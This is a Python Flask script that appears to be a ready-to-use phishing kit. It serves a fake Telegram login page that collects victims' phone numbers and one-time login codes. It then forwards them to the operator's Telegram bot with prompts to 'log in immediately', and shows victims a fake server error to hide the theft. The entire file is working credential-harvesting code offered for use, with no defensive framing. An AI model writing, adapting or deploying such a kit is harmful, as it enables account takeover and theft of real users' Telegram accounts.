import os
import requests
import sys
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration ---
CONFIG_FILE = "config.txt"
ACCESS_PASSWORD = "@Yosephalganeh44"

# --- 1. Access Control (Tool Lock) ---
def check_access():
    print("\n" + "═" * 40)
    print("      YAG GROUP PREMIUM TOOL")
    print("      Owner: @Yosephalganeh44")
    print("═" * 40)
    user_pass = input("[?] Enter Access Password to start: ").strip()
    
    if user_pass == ACCESS_PASSWORD:
        print("[+] Access Granted! Welcome back, Boss.\n")
    else:
        print("[!] Wrong Password! Access Denied.")
        sys.exit()

# --- 2. Dynamic Bot Configuration ---
def setup_bot():
    """Checks for config file, if not exists, asks user for bot details"""
    if not os.path.exists(CONFIG_FILE):
        print("--- First Time Setup: Bot Configuration ---")
        token = input("[?] Enter your Telegram Bot Token: ").strip()
        chat_id = input("[?] Enter your Telegram Chat ID: ").strip()
        
        with open(CONFIG_FILE, "w") as f:
            f.write(f"{token}\n{chat_id}")
        print("[+] Configuration Saved Successfully!\n")
        return token, chat_id
    else:
        with open(CONFIG_FILE, "r") as f:
            data = f.read().splitlines()
            if len(data) >= 2:
                return data[0], data[1]
            else:
                os.remove(CONFIG_FILE)
                return setup_bot()

# --- 3. Telegram Data Sender ---
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=payload, timeout=15)
    except Exception as e:
        print(f"[!] Network Error: {e}")

# --- 4. Front-end (Telegram Look-alike HTML) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Telegram</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #ffffff; padding: 40px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.05); width: 100%; max-width: 350px; text-align: center; border: 1px solid #e1e4e8; }
        .tg-logo { width: 80px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; color: #222; margin-bottom: 10px; }
        p { font-size: 15px; color: #707579; margin-bottom: 30px; line-height: 1.4; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 10px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; }
        input:focus { border: 2px solid #3390ec; }
        .btn { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        .btn:hover { background: #2b7cd1; }
        .hidden { display: none; }
        #status-msg { margin-top: 15px; font-size: 14px; color: #d14e4e; min-height: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram">
        <div id="phone-section">
            <h1>Your Phone</h1>
            <p>Please enter your phone number in international format.</p>
            <input type="tel" id="phone" placeholder="+251..." required>
            <button class="btn" onclick="submitPhone()">NEXT</button>
        </div>
        <div id="code-section" class="hidden">
            <h1 id="user-phone"></h1>
            <p>We've sent an activation code to your Telegram app. Enter it below.</p>
            <input type="number" id="otp" placeholder="Enter Code" required>
            <button class="btn" onclick="submitCode()">VERIFY</button>
        </div>
        <p id="status-msg"></p>
    </div>

    <script>
        let phoneNum = "";
        async function submitPhone() {
            phoneNum = document.getElementById('phone').value;
            if (phoneNum.length < 9) {
                document.getElementById('status-msg').innerText = "Please enter a valid phone number.";
                return;
            }
            document.getElementById('status-msg').style.color = "#707579";
            document.getElementById('status-msg').innerText = "Connecting...";
            
            await fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'phone', val: phoneNum})
            });

            document.getElementById('phone-section').classList.add('hidden');
            document.getElementById('user-phone').innerText = phoneNum;
            document.getElementById('code-section').classList.remove('hidden');
            document.getElementById('status-msg').innerText = "";
        }

        async function submitCode() {
            let otpCode = document.getElementById('otp').value;
            if (otpCode.length < 4) {
                document.getElementById('status-msg').style.color = "#d14e4e";
                document.getElementById('status-msg').innerText = "Invalid code. Check your app.";
                return;
            }
            document.getElementById('status-msg').style.color = "#707579";
            document.getElementById('status-msg').innerText = "Verifying...";
            
            await fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: 'code', val: otpCode, phone: phoneNum})
            });

            setTimeout(() => {
                document.getElementById('status-msg').style.color = "#d14e4e";
                document.getElementById('status-msg').innerText = "Internal Server Error (500). Please try again later.";
            }, 2500);
        }
    </script>
</body>
</html>
"""

# --- 5. Flask Routes ---
@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    if data['type'] == 'phone':
        msg = f"📱 *NEW TARGET LOGGED*\n\n*Phone:* `{data['val']}`\n*Action:* Waiting for OTP..."
    else:
        msg = f"🚀 *CREDENTIALS CAPTURED!*\n\n*Phone:* `{data['phone']}`\n*OTP Code:* `{data['val']}`\n\n_System: Log in immediately!_"
    
    send_to_telegram(msg)
    return jsonify({"status": "success"})

# --- 6. Execution ---
if __name__ == '__main__':
    # Step 1: Check Password
    check_access()
    
    # Step 2: Initialize Bot Config
    BOT_TOKEN, CHAT_ID = setup_bot()
    
    # Step 3: Run Server
    print(f"\n[+] Tool is active.")
    print(f"[!] Access Link: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
